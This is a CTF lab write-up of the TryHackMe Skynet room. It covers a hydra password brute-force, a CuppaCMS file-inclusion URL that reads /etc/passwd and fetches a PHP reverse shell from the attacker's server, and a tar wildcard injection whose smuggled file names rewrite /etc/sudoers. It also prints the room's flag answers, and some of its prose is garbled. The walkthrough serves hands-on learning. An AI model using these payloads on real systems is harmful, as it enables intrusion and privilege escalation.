---
title: 𝑻𝒓𝒚𝑯𝒂𝒄𝒌𝑴𝒆 𝑾𝒂𝒍𝒌𝑻𝒉𝒓𝒐𝒖𝒈𝒉 𝑺𝒌𝒚𝒏𝒆𝒕
author: 0xYumeko
date: 2024-01-28 11:31:00 +0700
categories: [𝑻𝒓𝒚𝑯𝒂𝒄𝒌𝑴𝒆 𝑾𝒂𝒍𝒌𝑻𝒉𝒓𝒐𝒖𝒈𝒉 𝑺𝒌𝒚𝒏𝒆𝒕]
tags: [Enumeration dirsearch smbclient hydra  Burp Suite Exploitation ]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/posts/L3ak-CTF/privesc_win.png
---



Sure, I can provide a general walkthrough for the Skynet room on TryHackMe. Here’s a step-by-step guide:


<h1> Deploy the Machine : </h1>


Log in to your TryHackMe account and navigate to the Skynet room.
Click on the “Deploy” button to spawn the virtual machine.
2. Adding registries to your /etc/hosts file makes it easier for machines to remember and learn by their unique names rather than their IP addresses. It also helps in cases where a DNS resolution may not be available or reliable



```bash
echo "10.10.225.54 Skynet.thm" | sudo tee -a  /etc/hosts
```


![1](https://github.com/user-attachments/assets/aa3f8c4e-7c70-40f1-9b58-bae4689b4d31)


<h1>Enumeration:</h1>

Start by enumerating the services running on the machine using tools like Nmap.


<h1>Run a basic Nmap scan to discover open ports and services : </h1>



```bash
nmap -sCV <machine_IP>
```



![10](https://github.com/user-attachments/assets/62fd68f7-3977-4a71-b999-66c002a83b3a)




<h1>Enumerate Web Service:</h1>


Once you have identified the open ports, check if there’s a web service running.
Visit the web service in your browser by navigating to http://<machine_IP>.


<h1>Examine the Website: </h1>


Look for any clues or hidden directories on the website. You can use tools like dirsearch for directory brute-forcing.
Examine the page source for any hidden comments or JavaScript.


<h1>dirsearch : </h1>



![15](https://github.com/user-attachments/assets/01c653cc-9a60-493c-b9ea-4562420cc0a4)



<h1>smbclient : </h1>


We have connected to major small businesses using smbclient. To share on the device. Anonymous Miles Dyson.



```bash
smbclient -L skynet.thm
```



![20](https://github.com/user-attachments/assets/a40e751b-d742-48af-bb2b-f0f4b7cb11db)



![25](https://github.com/user-attachments/assets/72021041-8964-4104-a5b9-363d761f1c6f)




<h1>Content of attention.txt : </h1>



![30](https://github.com/user-attachments/assets/8dac568c-58df-40e1-a382-302ed4cc2785)




<h1>Content of log1.txt a password list : </h1>



![35](https://github.com/user-attachments/assets/1c2b6ff4-5e32-4733-937f-1966683f6db6)




<h1>Cracking Squirrelmail password : </h1>

You can do this easily using Burp Suite and hydra



```bash
 hydra -l milesdyson -P log1.txt skynet.thm  http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20
```



<h1>Hydra : </h1>



![40](https://github.com/user-attachments/assets/02c390e3-48a2-4cae-bf7a-34416ca13d93)



<h1>Burp Suite : </h1>



![45](https://github.com/user-attachments/assets/1e20542c-8ccb-42e9-a023-7d48462c1c66)




<h1>We found it! Now we can log in : </h1>



![50](https://github.com/user-attachments/assets/f5d3e225-cb83-460e-9649-63501b85ff17)




<h1>Only the first looks to be important for us : </h1>



![55](https://github.com/user-attachments/assets/fb19ce1c-a6fd-4259-a757-6a3ed32fd4d3)



<h1>We found the password for smb, now we can login : </h1>



```bash
 smbclient //$ip/milesdyson -U milesdyson 
```



and we get access, inside are a lot of notes and files that we don’t necessary need, the only file that its usefull for us is important.txt




![1](https://github.com/user-attachments/assets/10723c91-09f1-45da-b8bb-6466e480f5a8)



![2](https://github.com/user-attachments/assets/5df13dc7-1319-4750-a499-7cad8f0e30a0)



![3](https://github.com/user-attachments/assets/c0577fe6-8820-45f9-bb88-15685aa227b1)



<h1>Inside we find the secret directory : </h1>



![4](https://github.com/user-attachments/assets/209cccac-9ff3-4679-ae3b-3ef9b1575431)



If we go to that directory we find a simple page, let’s run dirb to see if there are more hidden directories:



```bash
dirb http://10.10.167.117/45kra24zxs28v3yd/
```



We find /administrator if we go there we find that the page is running CuppaCMS, we can search for it on searchsploit:



![5](https://github.com/user-attachments/assets/f87d7bb8-cd83-4ea2-8046-3ec2abdc4a8d)




<h1>sign in : Cuppa CMS </h1>




![6](https://github.com/user-attachments/assets/74f047e2-ed5a-4f95-a69d-3a31b724ca94)



<h1>Exploitation : </h1>
We open searchsploit and search for the exploit in The CMS



![7](https://github.com/user-attachments/assets/3cee3634-600c-44fd-943a-1f2c68e2f076)



Reading the text file for the exploit, we see that it is possible to read the Local files on the target machine by targeting the urlConfig parameter in the alertConfigField.php. The best part is that it doesn’t even warrant a login into the CMS.



![8](https://github.com/user-attachments/assets/378506b3-04cb-4ea5-bdc8-fcc7656a477b)



we can read the /etc/passwd file on the target divice




```bash
http://target/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=.../../../../../../../../../etc/passwd
```



![9](https://github.com/user-attachments/assets/69672ff5-91fa-416b-8656-a5210845a78c)




We can get our reverse shell for revshells.com, select PHP PentestMonkey, enter your machine ip and the listening port (in my case I choose 1234), downloaded and put it inside a folder
Start a http server in the folder where you downloaded your revshell:




```bash
python3 -m http.server
```



<h1> Start our listener :  </h1>



After executing this on our browser, a reverse shell should be opened on our side



```bash
nc -lvnp 1337
```



<h1> Request the link : </h1>




```bash
http://skynet/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.224.219/php-reverse-shell.php
```



Now we get our reverse shell!


We can spawn a shell with python:



```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```



```txt
we see that there is a photo user named Melideson. You Have highlighted the user within their home directory .
```



![10](https://github.com/user-attachments/assets/e81505b9-c1e1-4ca8-ad69-edf27f6fe359)



```
Answer: 7ce5c2109a40f958099283600a9ae807
```



Inside /home/milesdyson/backups we find a file backup.sh and see that every minutes a script is being executed, we can perfom a wildcard injection.



![11](https://github.com/user-attachments/assets/3d3cc288-5970-4d67-8dff-37ddf1f3767d)



We run this commads, inside the folder /var/www/html:



![12](https://github.com/user-attachments/assets/0eeed21b-1c68-460e-9025-e9b0004c4982)




```bash
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > pavan.sh
echo "/var/www/html"  > "--checkpoint-action=exec=sh pavan.sh"
echo "/var/www/html"  > --checkpoint=1
```



![13](https://github.com/user-attachments/assets/aa7b133d-0c71-49c9-8acb-615d174775b2)




```bash
And get the root shell, and then we can find the tag /root/root.txt
```



```
Answer: 3f0372db24753accc7179a282cd6a949
```



![14](https://github.com/user-attachments/assets/cf1c459e-fc79-4bb3-93e3-012405016a6a)















